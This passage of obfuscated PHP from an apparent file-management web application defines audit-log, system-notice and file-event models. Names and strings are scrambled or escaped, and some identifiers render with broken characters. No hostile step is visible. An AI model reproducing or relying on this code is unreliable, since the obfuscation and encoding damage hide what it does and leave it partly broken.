array($Ï…‘‘ö²ô[1727]), $Ï…‘‘ö²ô[2083] => array($Ï…‘‘ö²ô[2142]), $Ï…‘‘ö²ô[2085] => array($Ï…‘‘ö²ô[2143]), $Ï…‘‘ö²ô[1719] => array($Ï…‘‘ö²ô[1720]), $Ï…‘‘ö²ô[2093] => array(), $Ï…‘‘ö²ô[2095] => array(), $Ï…‘‘ö²ô[2097] => array(), $Ï…‘‘ö²ô[1729] => array($Ï…‘‘ö²ô[1731]), $Ï…‘‘ö²ô[1730] => array($Ï…‘‘ö²ô[1731]), $Ï…‘‘ö²ô[2101] => array($Ï…‘‘ö²ô[2144]), $Ï…‘‘ö²ô[2103] => array($Ï…‘‘ö²ô[2144]), $Ï…‘‘ö²ô[2105] => array($Ï…‘‘ö²ô[2145]), $Ï…‘‘ö²ô[2091] => array($Ï…‘‘ö²ô[2146]), $Ï…‘‘ö²ô[1724] => array($Ï…‘‘ö²ô[2147]), $Ï…‘‘ö²ô[2108] => array($Ï…‘‘ö²ô[2148]), $Ï…‘‘ö²ô[1723] => array($Ï…‘‘ö²ô[1725])); return $¢ÙïÎ±ş; } private function typeAll() { $Û¹„Ù³û‰ =& $_SERVER[èÍ×öˆøÉ]; $—õô = $this->typeList; $ñ»äù¨¸‰ = array_filter($this->typeFile()); foreach ($ñ»äù¨¸‰ as $•Ş’ö => $¶Ëûû¯) { $—õô[$¶Ëûû¯[0]] = $—õô[$•Ş’ö]; } $—õô[$Û¹„Ù³û‰[1731]] = LNG($Û¹„Ù³û‰[2149]); $—õô[$Û¹„Ù³û‰[2144]] = LNG($Û¹„Ù³û‰[2150]); return $—õô; } public function addLog($³Î¥•‹·ß, $¢ŠÅ¶ĞÁ± = array()) { $úµ =& $_SERVER[èÍ×öˆøÉ]; if (!isset($this->typeList[$³Î¥•‹·ß])) { return; } $ÌÒ‡ = defined($úµ[468]) && USER_ID ? USER_ID : (isset($¢ŠÅ¶ĞÁ±[$úµ[1582]]) ? $¢ŠÅ¶ĞÁ±[$úµ[1582]] : 0); if (!$ÌÒ‡) { $ÌÒ‡ = (int) Session::get($úµ[1883]); } $›¦ì = get_client_ip(); if (!$¢ŠÅ¶ĞÁ± || strlen(json_encode($¢ŠÅ¶ĞÁ±)) >= 1024) { $¢ŠÅ¶ĞÁ± = array($úµ[2151] => $›¦ì); } else { if (is_array($¢ŠÅ¶ĞÁ±)) { $¢ŠÅ¶ĞÁ±[$úµ[2151]] = $›¦ì; } else { $¢ŠÅ¶ĞÁ± = array($úµ[1126] => $¢ŠÅ¶ĞÁ±, $úµ[2151] => $›¦ì); } } $¢ŠÅ¶ĞÁ± = array($úµ[1572] => Session::sign(), $úµ[1573] => $ÌÒ‡, $úµ[29] => $³Î¥•‹·ß, $úµ[1575] => json_encode($¢ŠÅ¶ĞÁ±)); parent::add($¢ŠÅ¶ĞÁ±); } public function remove($€±®ÙËá) { $this->where(array($_SERVER[èÍ×öˆøÉ][414] => $€±®ÙËá))->delete(); } private function _makeOrder($Û­€½ªÈ‚¸Â = '') { $ü ÒĞœÇî© =& $_SERVER[èÍ×öˆøÉ]; $Ö’ß = $ü ÒĞœÇî©[194]; $²Õ‡ÃÕ‡æ·ÈÉ = array($ü ÒĞœÇî©[442] => $ü ÒĞœÇî©[443], $ü ÒĞœÇî©[444] => $ü ÒĞœÇî©[445]); $½«Ò¡ = Input::get($ü ÒĞœÇî©[450], $ü ÒĞœÇî©[7], $ü ÒĞœÇî©[1915], array($ü ÒĞœÇî©[1839], $ü ÒĞœÇî©[444])); $½«Ò¡ = $²Õ‡ÃÕ‡æ·ÈÉ[$½«Ò¡]; $Û­€½ªÈ‚¸Â = $Û­€½ªÈ‚¸Â . "{$Ö’ß}\40{$½«Ò¡}"; return $this->order($Û­€½ªÈ‚¸Â); } public function get($âÊ˜áï = '') { $”‹•Ô¯µë =& $_SERVER[èÍ×öˆøÉ]; if (!$âÊ˜áï) { show_json(array()); } $òİæ‰º = array(); if ($âÊ˜áï[$”‹•Ô¯µë[1582]]) { $òİæ‰º[$”‹•Ô¯µë[1582]] = $âÊ˜áï[$”‹•Ô¯µë[1582]]; } if (isset($âÊ˜áï[$”‹•Ô¯µë[756]])) { $½ßƒ‰ê± = $âÊ˜áï[$”‹•Ô¯µë[756]]; $¨Û¾Øş = isset($âÊ˜áï[$”‹•Ô¯µë[490]]) ? $âÊ˜áï[$”‹•Ô¯µë[490]] : time(); $òİæ‰º[$”‹•Ô¯µë[194]] = array($”‹•Ô¯µë[331], array($½ßƒ‰ê±, $¨Û¾Øş)); } if ($âÊ˜áï[$”‹•Ô¯µë[29]]) { $Ù¥¥ = explode($”‹•Ô¯µë[47], $âÊ˜áï[$”‹•Ô¯µë[29]]); $”ôëŠÄŒ˜ = $this->typeFile(); $äç© = array(); foreach ($Ù¥¥ as $ĞŸŒı²×‹‘¾ã) { $äç©[] = $ĞŸŒı²×‹‘¾ã; if (isset($”ôëŠÄŒ˜[$ĞŸŒı²×‹‘¾ã])) { $äç© = array_merge($äç©, $”ôëŠÄŒ˜[$ĞŸŒı²×‹‘¾ã]); } } $äç© = array_unique($äç©); if ($äç©) { $òİæ‰º[$”‹•Ô¯µë[29]] = array($”‹•Ô¯µë[7], $äç©); } } else { $òİæ‰º[$”‹•Ô¯µë[29]] = array($”‹•Ô¯µë[2152], $”‹•Ô¯µë[2153]); } if (!empty($âÊ˜áï[$”‹•Ô¯µë[2151]])) { $òİæ‰º[$”‹•Ô¯µë[445]] = array($”‹•Ô¯µë[381], "\x25{$âÊ˜áï[$”‹•Ô¯µë[2151]]}\45"); } $Ò‚ÖœÑ¿®Ã = $this->_makeOrder()->where($òİæ‰º)->selectPage(); if (empty($Ò‚ÖœÑ¿®Ã[$”‹•Ô¯µë[367]])) { show_json(array(), !0, $Ò‚ÖœÑ¿®Ã[$”‹•Ô¯µë[364]]); } $Ò‚ÖœÑ¿®Ã[$”‹•Ô¯µë[367]] = $this->logList($Ò‚ÖœÑ¿®Ã[$”‹•Ô¯µë[367]]); return $Ò‚ÖœÑ¿®Ã; } private function ipAddress(&$Ñ) { $Úù =& $_SERVER[èÍ×öˆøÉ]; if (!empty($Ñ[$Úù[2151]])) { $†µµÙÇíéâÚ = IpLocation::get($Ñ[$Úù[2151]]); } else { $†µµÙÇíéâÚ = LNG($Úù[2154]); } $Ñ[$Úù[2155]] = $†µµÙÇíéâÚ; } private function descZipDownload($ÀÛÍá, &$¾Ô÷¼äì¡) { $µú€Ò‘á²¶¢ =& $_SERVER[èÍ×öˆøÉ]; if (!isset($ÀÛÍá[$µú€Ò‘á²¶¢[2156]])) { return; } $¢¬ğ®¡°ï = json_decode($ÀÛÍá[$µú€Ò‘á²¶¢[2156]], !0); foreach ($¢¬ğ®¡°ï as $ßŒôİ×ãÉ) { try { $Ç®Ï˜Áå = IO::infoFull($ßŒôİ×ãÉ[$µú€Ò‘á²¶¢[76]]); } catch (Exception $ÊÖÊ»ì ª«) { continue; } $ÀÛÍá[$µú€Ò‘á²¶¢[76]] = $ßŒôİ×ãÉ[$µú€Ò‘á²¶¢[76]]; $¾Ô÷¼äì¡[] = $ÀÛÍá[$µú€Ò‘á²¶¢[397]] = $Ç®Ï˜Áå[$µú€Ò‘á²¶¢[397]]; $¾Ô÷¼äì¡[] = $ÀÛÍá[$µú€Ò‘á²¶¢[1969]] = $Ç®Ï˜Áå[$µú€Ò‘á²¶¢[492]]; break; } return $ÀÛÍá; } private function getSourceList(&$‘úÓ•ƒĞÖä) { $«ù¥ =& $_SERVER[èÍ×öˆøÉ]; $İ°’â² = array(); foreach ($‘úÓ•ƒĞÖä as $œ» => $Â¾) { $®¦ñò¸Ü© = json_decode($Â¾[$«ù¥[445]], !0); if ($Â¾[$«ù¥[29]] == $«ù¥[1722]) { $®¦ñò¸Ü© = $this->descZipDownload($®¦ñò¸Ü©, $İ°’â²); $‘úÓ•ƒĞÖä[$œ»][$«ù¥[445]] = json_encode($®¦ñò¸Ü©); continue; } if (strpos($Â¾[$«ù¥[29]], $«ù¥[1970]) !== 0) { if (!isset($®¦ñò¸Ü©[$«ù¥[76]]) || strpos($Â¾[$«ù¥[29]], $«ù¥[2157]) !== 0) { continue; } try { $É”–ßà = IO::infoFull($®¦ñò¸Ü©[$«ù¥[76]]); } catch (Exception $å¯æ‘Êş) { continue; } $İ°’â²[] = $®¦ñò¸Ü©[$«ù¥[397]] = $É”–ßà[$«ù¥[397]]; $İ°’â²[] = $®¦ñò¸Ü©[$«ù¥[1969]] = $É”–ßà[$«ù¥[492]]; $‘úÓ•ƒĞÖä[$œ»][$«ù¥[445]] = json_encode($®¦ñò¸Ü©); continue; } $İ°’â²[] = $®¦ñò¸Ü©[$«ù¥[397]]; $İ°’â²[] = $®¦ñò¸Ü©[$«ù¥[1969]]; if ($®¦ñò¸Ü©[$«ù¥[29]] == $«ù¥[545]) { $İ°’â²[] = $®¦ñò¸Ü©[$«ù¥[445]][$«ù¥[1093]]; $İ°’â²[] = $®¦ñò¸Ü©[$«ù¥[445]][$«ù¥[1094]]; } if ($®¦ñò¸Ü©[$«ù¥[29]] == $«ù¥[1977]) { $İ°’â²[] = $®¦ñò¸Ü©[$«ù¥[445]][$«ù¥[397]]; } } if (!$İ°’â²) { return array(); } return Model($«ù¥[827])->sourceListInfo($İ°’â², !0); } private function logList($¶Ş©û) { $ß•°å¿İùõƒ =& $_SERVER[èÍ×öˆøÉ]; $íÍ÷¶² = array_to_keyvalue($¶Ş©û, $ß•°å¿İùõƒ[33], $ß•°å¿İùõƒ[1582]); $†È–º· = Model($ß•°å¿İùõƒ[532])->userListInfo(array_unique($íÍ÷¶²)); $åÀÁ€‘“ = $this->getSourceList($¶Ş©û); $áïøø‰üß = $this->typeAll(); $Ê¡ = array(); $ğßÅüı‹±ä = array(); foreach ($¶Ş©û as $…Çşô¬±º => $¶¶•Ô) { $½ëŸ»å€ = $¶¶•Ô[$ß•°å¿İùõƒ[29]]; $˜—å’Ìöò¶ = isset($†È–º·[$¶¶•Ô[$ß•°å¿İùõƒ[1582]]]) ? $†È–º·[$¶¶•Ô[$ß•°å¿İùõƒ[1582]]] : !1; $áí = strpos($½ëŸ»å€, $ß•°å¿İùõƒ[2158]) === 0 ? LNG($ß•°å¿İùõƒ[2159]) : LNG($ß•°å¿İùõƒ[2154]); $¶¶•Ô[$ß•°å¿İùõƒ[28]] = isset($˜—å’Ìöò¶[$ß•°å¿İùõƒ[28]]) ? $˜—å’Ìöò¶[$ß•°å¿İùõƒ[28]] : LNG($ß•°å¿İùõƒ[2154]); $¶¶•Ô[$ß•°å¿İùõƒ[2017]] = isset($˜—å’Ìöò¶[$ß•°å¿İùõƒ[2017]]) ? $˜—å’Ìöò¶[$ß•°å¿İùõƒ[2017]] : $ß•°å¿İùõƒ[33]; $¶¶•Ô[$ß•°å¿İùõƒ[1485]] = isset($áïøø‰üß[$½ëŸ»å€]) ? $áïøø‰üß[$½ëŸ»å€] : $áí; $¶¶•Ô[$ß•°å¿İùõƒ[1914]] = $˜—å’Ìöò¶; $Û×Ğõê²ÃÁã = json_decode($¶¶•Ô[$ß•°å¿İùõƒ[445]], !0); $¶¶•Ô[$ß•°å¿İùõƒ[2151]] = isset($Û×Ğõê²ÃÁã[$ß•°å¿İùõƒ[2151]]) ? $Û×Ğõê²ÃÁã[$ß•°å¿İùõƒ[2151]] : $ß•°å¿İùõƒ[33]; $¶¶•Ô[$ß•°å¿İùõƒ[2155]] = IpLocation::get($¶¶•Ô[$ß•°å¿İùõƒ[2151]]); if (strpos($½ëŸ»å€, $ß•°å¿İùõƒ[1970]) === 0 || isset($Û×Ğõê²ÃÁã[$ß•°å¿İùõƒ[1969]])) { $Û×Ğõê²ÃÁã[$ß•°å¿İùõƒ[85]] = $åÀÁ€‘“[$Û×Ğõê²ÃÁã[$ß•°å¿İùõƒ[397]]]; $Û×Ğõê²ÃÁã[$ß•°å¿İùõƒ[1982]] = $åÀÁ€‘“[$Û×Ğõê²ÃÁã[$ß•°å¿İùõƒ[1969]]]; if ($Û×Ğõê²ÃÁã[$ß•°å¿İùõƒ[29]] == $ß•°å¿İùõƒ[545]) { $Û×Ğõê²ÃÁã[$ß•°å¿İùõƒ[445]][$ß•°å¿İùõƒ[1093]] = $åÀÁ€‘“[$Û×Ğõê²ÃÁã[$ß•°å¿İùõƒ[445]][$ß•°å¿İùõƒ[1093]]]; $Û×Ğõê²ÃÁã[$ß•°å¿İùõƒ[445]][$ß•°å¿İùõƒ[1094]] = $åÀÁ€‘“[$Û×Ğõê²ÃÁã[$ß•°å¿İùõƒ[445]][$ß•°å¿İùõƒ[1094]]]; } if ($Û×Ğõê²ÃÁã[$ß•°å¿İùõƒ[29]] == $ß•°å¿İùõƒ[1977]) { $Û×Ğõê²ÃÁã[$ß•°å¿İùõƒ[445]][$ß•°å¿İùõƒ[397]] = $åÀÁ€‘“[$Û×Ğõê²ÃÁã[$ß•°å¿İùõƒ[445]][$ß•°å¿İùõƒ[397]]]; } if ($Û×Ğõê²ÃÁã[$ß•°å¿İùõƒ[29]] == $ß•°å¿İùõƒ[1717]) { $Û×Ğõê²ÃÁã[$ß•°å¿İùõƒ[1982]] = $Û×Ğõê²ÃÁã[$ß•°å¿İùõƒ[85]]; $Û×Ğõê²ÃÁã[$ß•°å¿İùõƒ[1969]] = $Û×Ğõê²ÃÁã[$ß•°å¿İùõƒ[1982]][$ß•°å¿İùõƒ[397]]; $Û×Ğõê²ÃÁã[$ß•°å¿İùõƒ[85]] = !1; $Û×Ğõê²ÃÁã[$ß•°å¿İùõƒ[397]] = $ß•°å¿İùõƒ[33]; } if ($Û×Ğõê²ÃÁã[$ß•°å¿İùõƒ[85]] && $Û×Ğõê²ÃÁã[$ß•°å¿İùõƒ[85]][$ß•°å¿İùõƒ[406]] == $ß•°å¿İùõƒ[1209]) { $ğßÅüı‹±ä[] = $¶¶•Ô[$ß•°å¿İùõƒ[395]]; unset($¶Ş©û[$…Çşô¬±º]); continue; } if ($Û×Ğõê²ÃÁã[$ß•°å¿İùõƒ[1982]] && $Û×Ğõê²ÃÁã[$ß•°å¿İùõƒ[1982]][$ß•°å¿İùõƒ[406]] == $ß•°å¿İùõƒ[1209]) { $ğßÅüı‹±ä[] = $¶¶•Ô[$ß•°å¿İùõƒ[395]]; unset($¶Ş©û[$…Çşô¬±º]); continue; } } $¶¶•Ô[$ß•°å¿İùõƒ[445]] = $Û×Ğõê²ÃÁã; unset($¶¶•Ô[$ß•°å¿İùõƒ[2160]]); $Ê¡[] = $¶¶•Ô; } $this->clearSystemPathLog($ğßÅüı‹±ä); return $Ê¡; } private function clearSystemPathLog($õ¦ÀÄÉ) { $“ÍŸ€šÊ©†§‡ =& $_SERVER[èÍ×öˆøÉ]; if (count($õ¦ÀÄÉ) == 0) { return; } $™ÍàÂ¾µ = array($“ÍŸ€šÊ©†§‡[395] => array($“ÍŸ€šÊ©†§‡[7], array_unique($õ¦ÀÄÉ))); $this->where($™ÍàÂ¾µ)->delete(); } public function deviceList($Æ¬Â˜ÓÔ‡…£, $˜» = 0) { $§ =& $_SERVER[èÍ×öˆøÉ]; $æÏë«˜ = array($§[1582] => $Æ¬Â˜ÓÔ‡…£, $§[194] => array($§[1011], $˜»), $§[29] => $§[1691]); $®¥ÁçØ¢¨ÄÏ = array(); $ëœğšåÎôÍ = $this->field($§[2161])->where($æÏë«˜)->order($§[1980])->limit(50)->select(); foreach ($ëœğšåÎôÍ as $¿Şüæ¶„µ‰»é => $æò) { if ($¿Şüæ¶„µ‰»é > 0 && abs($æò[$§[194]] - $ëœğšåÎôÍ[$¿Şüæ¶„µ‰»é - 1][$§[194]]) < 5) { continue; } $Ã§ = json_decode($æò[$§[445]], !0); $æò[$§[2151]] = isset($Ã§[$§[2151]]) ? $Ã§[$§[2151]] : $§[33]; unset($Ã§[$§[2151]]); $õ®Ëıìì = $this->deviceType($Ã§[$§[1971]]); if (isset($®¥ÁçØ¢¨ÄÏ[$õ®Ëıìì])) { continue; } $æò[$§[2155]] = IpLocation::get($æò[$§[2151]]); $æò[$§[445]] = $Ã§; $®¥ÁçØ¢¨ÄÏ[$õ®Ëıìì] = $æò; } return array_values($®¥ÁçØ¢¨ÄÏ); } public function deviceType($Ô›) { return $Ô›; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\155\x2e\x6e\157\x74\151\143\145\114\x69\x73\164"; public $field = array("\156\x61\155\x65", "\x63\x6f\156\x74\x65\156\x74", "\141\x75\164\x68", "\155\157\144\x65", "\x74\x69\155\145", "\x74\171\x70\145", "\154\145\x76\145\x6c", "\145\x6e\141\x62\154\x65", "\163\x6f\162\164"); public function listData($ıÛíÄ¬à = false, $é½’Úô¯Ş = "\163\157\x72\164", $ª¤ıû×ãØêÄ = false) { return parent::listData($ıÛíÄ¬à, $é½’Úô¯Ş, $ª¤ıû×ãØêÄ); } public function add($·åÃ¡¹«šå) { $èšÈ‰õÅ =& $_SERVER[èÍ×öˆøÉ]; $Ÿˆë«ˆ£ = time(); if ($·åÃ¡¹«šå[$èšÈ‰õÅ[12]] == $èšÈ‰õÅ[2162]) { $Ÿˆë«ˆ£ = strtotime($·åÃ¡¹«šå[$èšÈ‰õÅ[197]]); } $·åÃ¡¹«šå[$èšÈ‰õÅ[197]] = $Ÿˆë«ˆ£; return parent::insert($·åÃ¡¹«šå); } public function update($£«æÏô, $ø²ì¾) { $–×ÁŞî =& $_SERVER[èÍ×öˆøÉ]; $ ¹ş÷Œ”¯¦ù = $this->listData($£«æÏô); if (!$ ¹ş÷Œ”¯¦ù) { return !1; } $Ï¿“´æ = time(); if ($ø²ì¾[$–×ÁŞî[12]] == $–×ÁŞî[2162]) { $Ï¿“´æ = strtotime($ø²ì¾[$–×ÁŞî[197]]); } $ø²ì¾[$–×ÁŞî[197]] = $Ï¿“´æ; return parent::update($£«æÏô, $ø²ì¾); } public function remove($¯é) { $šï¶ìÌ¼ = $this->listData($¯é); if (!$šï¶ìÌ¼ || $šï¶ìÌ¼[$_SERVER[èÍ×öˆøÉ][1209]]) { return !1; } return parent::remove($¯é); } public function sort($ú¦Ó©, $ÚôÄ) { return parent::update($ú¦Ó©, $ÚôÄ); } public function enable($Ÿö—Åó÷Æ, $¡”®™ØÆç) { return parent::update($Ÿö—Åó÷Æ, array($_SERVER[èÍ×öˆøÉ][2163] => $¡”®™ØÆç)); } private function initUserOption() { $Ğğ”§ç°Ùä =& $_SERVER[èÍ×öˆøÉ]; $this->optionType = $Ğğ”§ç°Ùä[2164]; $this->modelType = $Ğğ”§ç°Ùä[2165]; $this->field = array($Ğğ”§ç°Ùä[2166], $Ğğ”§ç°Ùä[28], $Ğğ”§ç°Ùä[197], $Ğğ”§ç°Ùä[29], $Ğğ”§ç°Ùä[2167], $Ğğ”§ç°Ùä[745], $Ğğ”§ç°Ùä[189]); } public function userNoticeGet($ŞñáŒ–‡Ñ£º = false) { $this->initUserOption(); return parent::listData($ŞñáŒ–‡Ñ£º, $_SERVER[èÍ×öˆøÉ][395], !0); } public function userNoticeAdd($¯ÛÄËÀâî) { $êå =& $_SERVER[èÍ×öˆøÉ]; $this->initUserOption(); $‘ï¾ØºöÉ› = $this->findByKey($êå[2166], $¯ÛÄËÀâî[$êå[395]]); if ($‘ï¾ØºöÉ›) { return !0; } $­¿Üüä– = array($êå[2166] => $¯ÛÄËÀâî[$êå[395]], $êå[28] => $¯ÛÄËÀâî[$êå[28]], $êå[197] => $¯ÛÄËÀâî[$êå[197]], $êå[29] => isset($¯ÛÄËÀâî[$êå[29]]) ? $¯ÛÄËÀâî[$êå[29]] : 1, $êå[2167] => isset($¯ÛÄËÀâî[$êå[2167]]) ? $¯ÛÄËÀâî[$êå[2167]] : 0, $êå[745] => 0, $êå[189] => 0); return parent::insert($­¿Üüä–); } public function userNoticeEdit($Ğ¼ˆÛâ¬ú¦, $ò­ĞÉòĞ) { $this->initUserOption(); return parent::update($Ğ¼ˆÛâ¬ú¦, $ò­ĞÉòĞ); } } goto CŒµŞ¡ÚŞœ; a„»¿çØ‹²: class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\137\163\x6f\165\162\x63\x65\x5f\x65\x76\x65\x6e\164"; protected $dataAuto = array(array("\143\162\x65\141\x74\145\x54\x69\x6d\x65", "\164\x69\x6d\145", "\151\156\x73\145\162\x74", "\146\x75\x6e\143\x74\x69\157\156"), array("\x64\x65\163\143", '', "\x69\x6e\x73\145\x72\x74\54\165\160\x64\x61\x74\145\54\x73\145\x6c\145\143\164", "\152\x73\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($É»™ÑÆË×Şå, $û¿›«£¸‡, $×«Üì¿ = '') { $µäØÑ†«×Á =& $_SERVER[èÍ×öˆøÉ]; if (!$this->eventSave) { return; } $¼ š…Ö¶ş‚³Ê = Model($µäØÑ†«×Á[1256])->sourceInfo($É»™ÑÆË×Şå); if (!$¼ š…Ö¶ş‚³Ê) { return !1; } if ($this->isCacheEvent($¼ š…Ö¶ş‚³Ê, $û¿›«£¸‡)) { return; } if ($×«Üì¿ && is_string($×«Üì¿)) { $×«Üì¿ = array($µäØÑ†«×Á[1787] => $×«Üì¿); } $„ö½Äıá’ = array($µäØÑ†«×Á[412] => $É»™ÑÆË×Şå, $µäØÑ†«×Á[1963] => $¼ š…Ö¶ş‚³Ê[$µäØÑ†«×Á[492]], $µäØÑ†«×Á[1964] => $¼ š…Ö¶ş‚³Ê[$µäØÑ†«×Á[28]], $µäØÑ†«×Á[513] => !empty($¼ š…Ö¶ş‚³Ê[$µäØÑ†«×Á[513]]) ? $¼ š…Ö¶ş‚³Ê[$µäØÑ†«×Á[513]] : $µäØÑ†«×Á[33], $µäØÑ†«×Á[1573] => USER_ID, $µäØÑ†«×Á[417] => $û¿›«£¸‡, $µäØÑ†«×Á[1575] => $×«Üì¿); $this->addSystemLog($û¿›«£¸‡, $„ö½Äıá’); unset($„ö½Äıá’[$µäØÑ†«×Á[1964]], $„ö½Äıá’[$µäØÑ†«×Á[513]]); return $this->add($„ö½Äıá’); } private function addSystemLog($åø§şÁ, $İËò) { $Î°âÉ½¤çÄú =& $_SERVER[èÍ×öˆøÉ]; if ($åø§şÁ == $Î°âÉ½¤çÄú[1965]) { $åø§şÁ = $İËò[$Î°âÉ½¤çÄú[445]][$Î°âÉ½¤çÄú[1966]]; } else { if (in_array($åø§şÁ, array($Î°âÉ½¤çÄú[1728], $Î°âÉ½¤çÄú[1967]))) { $åø§şÁ = $İËò[$Î°âÉ½¤çÄú[445]][$Î°âÉ½¤çÄú[750]]; } } $ÂÃ¾Îéå = array_merge($İËò, array($Î°âÉ½¤çÄú[1968] => $İËò[$Î°âÉ½¤çÄú[397]], $Î°âÉ½¤çÄú[1969] => $İËò[$Î°âÉ½¤çÄú[1969]])); Model($Î°âÉ½¤çÄú[1692])->addLog($Î°âÉ½¤çÄú[1970] . $åø§şÁ, $ÂÃ¾Îéå); } private function isCacheEvent($·Ò, $Ã¹Ë¼Ù) { if ($·Ò[$_SERVER[èÍ×öˆøÉ][406]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($¢¬¹ß¯À, $°ÕğÎ¯ßÄô) { $‹üÛŸ =& $_SERVER[èÍ×öˆøÉ]; $µ¸÷˜Î = Model($‹üÛŸ[1256])->sourceInfo($¢¬¹ß¯À); $Å»ËöÃµ”ğ = array($‹üÛŸ[1966] => $°ÕğÎ¯ßÄô, $‹üÛŸ[28] => $µ¸÷˜Î[$‹üÛŸ[28]]); return $this->addEvent($¢¬¹ß¯À, $‹üÛŸ[1965], $Å»ËöÃµ”ğ); } public function eventFileEdit($Í–½¹²’–ş¾) { $ÈŠ”Ğ¿ÜÛ =& $_SERVER[èÍ×öˆøÉ]; $‡¯ = array($ÈŠ”Ğ¿ÜÛ[1971] => $_SERVER[$ÈŠ”Ğ¿ÜÛ[1972]], $ÈŠ”Ğ¿ÜÛ[1973] => strtolower(ACTION)); return $this->addEvent($Í–½¹²’–ş¾, $ÈŠ”Ğ¿ÜÛ[1718], $‡¯); } public function eventRecycle($İİ»ë‚Ò×, $–ëè÷) { return $this->addEvent($İİ»ë‚Ò×, $_SERVER[èÍ×öˆøÉ][1967], $–ëè÷); } public function eventRemove($Òµ·œÛñ¡) { $ßÙ =& $_SERVER[èÍ×öˆøÉ]; $ˆöã = Model($ßÙ[1256])->sourceInfo($Òµ·œÛñ¡); $ù„äÁÓıé½ä– = $ˆöã[$ßÙ[28]]; return $this->addEvent($ˆöã[$ßÙ[492]], $ßÙ[1717], $ù„äÁÓıé½ä–); } public function eventShare($üÅ, $²ÈĞ¿‰) { return $this->addEvent($üÅ, $_SERVER[èÍ×öˆøÉ][1728], $²ÈĞ¿‰); } public function eventMove($´ƒ¡—‚¨áÜ÷, $©Áô, $’½¯«Ÿ„) { $ï­âå =& $_SERVER[èÍ×öˆøÉ]; $ôÎò³¾ö¸¾· = Model($ï­âå[1256]); $Š¡—ô‡Ğ = $ôÎò³¾ö¸¾·->sourceInfo($´ƒ¡—‚¨áÜ÷); $Ã˜´ÙƒœÊÚ = $ôÎò³¾ö¸¾·->sourceInfo($©Áô); $¥ç¤øñà¼ = $ôÎò³¾ö¸¾·->sourceInfo($’½¯«Ÿ„); $ ÖŠĞÍ§ = array($ï­âå[1093] => $©Áô, $ï­âå[1974] => $Ã˜´ÙƒœÊÚ[$ï­âå[28]], $ï­âå[1954] => !empty($Ã˜´ÙƒœÊÚ[$ï­âå[513]]) ? $Ã˜´ÙƒœÊÚ[$ï­âå[513]] : $ï­âå[33], $ï­âå[1094] => $’½¯«Ÿ„, $ï­âå[1975] => $¥ç¤øñà¼[$ï­âå[28]], $ï­âå[1976] => !empty($¥ç¤øñà¼[$ï­âå[513]]) ? $¥ç¤øñà¼[$ï­âå[513]] : $ï­âå[33]); $this->addEvent($´ƒ¡—‚¨áÜ÷, $ï­âå[545], $ ÖŠĞÍ§); $Š¡—ô‡Ğ = $ôÎò³¾ö¸¾·->sourceInfo($´ƒ¡—‚¨áÜ÷); $ ÖŠĞÍ§ = array($ï­âå[397] => $Š¡—ô‡Ğ[$ï­âå[397]], $ï­âå[28] => $Š¡—ô‡Ğ[$ï­âå[28]]); $this->addEvent($©Áô, $ï­âå[1977], $ ÖŠĞÍ§); } public function eventCopy($´—×Âå¼ÍÇ) { $this->eventCreate($´—×Âå¼ÍÇ, $_SERVER[èÍ×öˆøÉ][543]); } public function eventRename($¹ È‘, $¢ª, $èÅÌÉ¨¾®â) { $«›áìşÕ‹’æƒ =& $_SERVER[èÍ×öˆøÉ]; $£æİçü« = array($«›áìşÕ‹’æƒ[1093] => $¢ª, $«›áìşÕ‹’æƒ[1094] => $èÅÌÉ¨¾®â); return $this->addEvent($¹ È‘, $«›áìşÕ‹’æƒ[1270], $£æİçü«); } public function eventAddComment($üÜ, $µÃ»±) { return $this->addEvent($üÜ, $_SERVER[èÍ×öˆøÉ][1978], $µÃ»±); } public function eventAddDesc($ŸáŞ²°»•Ôºä, $ó¸Ÿœ) { return $this->addEvent($ŸáŞ²°»•Ôºä, $_SERVER[èÍ×öˆøÉ][1979], $ó¸Ÿœ); } public function listBySource($Ò«¾êåêÏÀï†) { $¦Â€Ï“‘ =& $_SERVER[èÍ×öˆøÉ]; $ù¸¼¨Ê²à = Model($¦Â€Ï“‘[1256])->sourceInfo($Ò«¾êåêÏÀï†); $­Å¤ = array($¦Â€Ï“‘[412] => $Ò«¾êåêÏÀï†); if ($ù¸¼¨Ê²à[$¦Â€Ï“‘[405]] == $¦Â€Ï“‘[87]) { $õš³„ï = Model($¦Â€Ï“‘[1256])->listSearchChildren($Ò«¾êåêÏÀï†, 20000); $õš³„ï[] = $Ò«¾êåêÏÀï† . $¦Â€Ï“‘[376]; $­Å¤ = array($¦Â€Ï“‘[397] => array($¦Â€Ï“‘[7], $õš³„ï)); } $­ô = $this->where($­Å¤)->order($¦Â€Ï“‘[1980])->selectPage(); if ($­ô[$¦Â€Ï“‘[364]][$¦Â€Ï“‘[365]] == 0) { $­ô[$¦Â€Ï“‘[364]][$¦Â€Ï“‘[365]] = 1; $­ô[$¦Â€Ï“‘[367]] = array(array($¦Â€Ï“‘[412] => $Ò«¾êåêÏÀï†, $¦Â€Ï“‘[1963] => $ù¸¼¨Ê²à[$¦Â€Ï“‘[492]], $¦Â€Ï“‘[1573] => $ù¸¼¨Ê²à[$¦Â€Ï“‘[446]], $¦Â€Ï“‘[417] => $¦Â€Ï“‘[1981], $¦Â€Ï“‘[418] => $ù¸¼¨Ê²à[$¦Â€Ï“‘[194]], $¦Â€Ï“‘[1575] => $¦Â€Ï“‘[33])); } return $this->eventListParse($­ô, $Ò«¾êåêÏÀï†); } private function eventListParse($À«Å, $°¨¿¹‚) { $½Şóµì =& $_SERVER[èÍ×öˆøÉ]; $”êºµĞ = $À«Å[$½Şóµì[367]]; $½¿—äîş–Ÿ­î = array_to_keyvalue($”êºµĞ, $½Şóµì[33], $½Şóµì[397]); $éåé = array_to_keyvalue($”êºµĞ, $½Şóµì[33], $½Şóµì[1969]); foreach ($”êºµĞ as $”á­§³ £±õŒ) { $áñ¶ñ = $”á­§³ £±õŒ[$½Şóµì[445]]; if ($”á­§³ £±õŒ[$½Şóµì[29]] == $½Şóµì[545] && isset($áñ¶ñ[$½Şóµì[1093]])) { $½¿—äîş–Ÿ­î[] = $áñ¶ñ[$½Şóµì[1093]] . $½Şóµì[33]; $½¿—äîş–Ÿ­î[] = $áñ¶ñ[$½Şóµì[1094]] . $½Şóµì[33]; } if ($”á­§³ £±õŒ[$½Şóµì[29]] == $½Şóµì[1977] && 